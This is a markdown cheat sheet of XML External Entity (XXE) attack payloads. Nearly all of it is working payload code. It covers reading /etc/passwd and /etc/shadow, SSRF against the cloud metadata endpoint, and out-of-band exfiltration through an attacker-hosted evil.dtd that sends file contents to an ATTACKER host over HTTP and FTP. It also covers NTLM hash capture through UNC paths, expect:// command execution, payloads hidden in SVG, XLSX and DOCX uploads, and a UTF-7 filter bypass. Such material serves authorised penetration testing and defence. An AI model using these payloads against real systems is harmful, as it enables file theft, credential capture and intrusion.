# XXE (XML External Entity) Payloads

## Classic XXE — File Read

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>
```

## XXE — SSRF

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<data>&xxe;</data>

<!-- Internal port scan -->
<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/">
<!ENTITY xxe SYSTEM "http://internal-host:3306/">
```

## Blind XXE — Out-of-Band (OOB)

### Via External DTD
```xml
<!-- Payload sent to target -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://ATTACKER/evil.dtd">
  %xxe;
]>
<data>test</data>
```

```xml
<!-- evil.dtd hosted on attacker server -->
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://ATTACKER/?d=%file;'>">
%eval;
%exfil;
```

### Via Error Messages
```xml
<!-- evil.dtd — forces error containing file content -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

### Via FTP (for multi-line extraction)
```xml
<!-- evil.dtd -->
<!ENTITY % file SYSTEM "file:///etc/shadow">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'ftp://ATTACKER:2121/%file;'>">
%eval;
%exfil;

<!-- Run FTP listener: python3 xxe-ftp-server.py -->
```

## PHP-Specific XXE

```xml
<!-- Base64 encode (avoids XML parsing issues with special chars) -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<data>&xxe;</data>

<!-- expect:// for RCE -->
<!ENTITY xxe SYSTEM "expect://id">
```

## .NET-Specific XXE

```xml
<!-- .NET supports DTD processing by default in older versions -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<data>&xxe;</data>

<!-- UNC path for NTLM hash capture -->
<!ENTITY xxe SYSTEM "\\ATTACKER\share\file">
```

## Java-Specific XXE

```xml
<!-- Java supports jar: protocol -->
<!ENTITY xxe SYSTEM "jar:http://ATTACKER/evil.jar!/file.txt">

<!-- netdoc: protocol (Java) -->
<!ENTITY xxe SYSTEM "netdoc:///etc/passwd">
```

## XXE in Different Formats

### SVG
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

### XLSX (Excel)
```
# XLSX is a ZIP containing XML files
# 1. Unzip: unzip file.xlsx -d xxe/
# 2. Edit xl/workbook.xml or [Content_Types].xml
# 3. Add XXE payload with DOCTYPE
# 4. Rezip: cd xxe && zip -r ../evil.xlsx *
# 5. Upload evil.xlsx
```

### DOCX (Word)
```
# Same principle as XLSX
# Edit word/document.xml
# Add XXE payload
# Rezip and upload
```

### SOAP
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <data>&xxe;</data>
  </soap:Body>
</soap:Envelope>
```

### RSS/Atom Feed
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<rss version="2.0">
  <channel>
    <title>&xxe;</title>
  </channel>
</rss>
```

## XInclude (When You Can't Control DOCTYPE)

```xml
<!-- If you can inject into XML body but not DOCTYPE -->
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

## Parameter Entity Tricks

```xml
<!-- Chain parameter entities for complex payloads -->
<!DOCTYPE foo [
  <!ENTITY % a "<!ENTITY &#x25; b SYSTEM 'file:///etc/passwd'>">
  %a;
  %b;
]>

<!-- UTF-7 encoding bypass -->
<?xml version="1.0" encoding="UTF-7"?>
+ADwAIQ-DOCTYPE foo +AFs-
  +ADwAIQ-ENTITY xxe SYSTEM +ACI-file:///etc/passwd+ACI-+AD4-
+AF0-+AD4-
+ADw-data+AD4AJg-xxe;+ADw-/data+AD4-
```

## Detection Checklist

```
1. Any endpoint that accepts XML (Content-Type: application/xml, text/xml)
2. File upload (XLSX, DOCX, SVG, XML)
3. SOAP web services
4. RSS/Atom feed parsers
5. SAML authentication (XML-based)
6. API endpoints that accept XML alongside JSON
7. Configuration file uploads
8. PDF generators that accept XML/HTML input
```
